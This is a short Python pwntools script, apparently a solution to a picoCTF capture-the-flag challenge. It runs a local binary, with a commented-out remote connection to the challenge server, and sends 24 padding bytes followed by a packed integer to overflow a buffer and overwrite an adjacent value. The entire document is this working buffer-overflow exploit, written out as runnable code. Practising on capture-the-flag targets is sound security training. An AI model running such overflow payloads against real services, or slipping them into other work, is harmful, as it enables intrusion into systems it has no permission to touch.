from pwn import *
import binascii

context.log_level = 'error'

r = process("./local-target")
# r = remote("saturn.picoctf.net", 61750)
print(r.recvuntil(b"Enter a string:"))

r.sendline(b"A"*24 + p64(65))
print(r.recvall())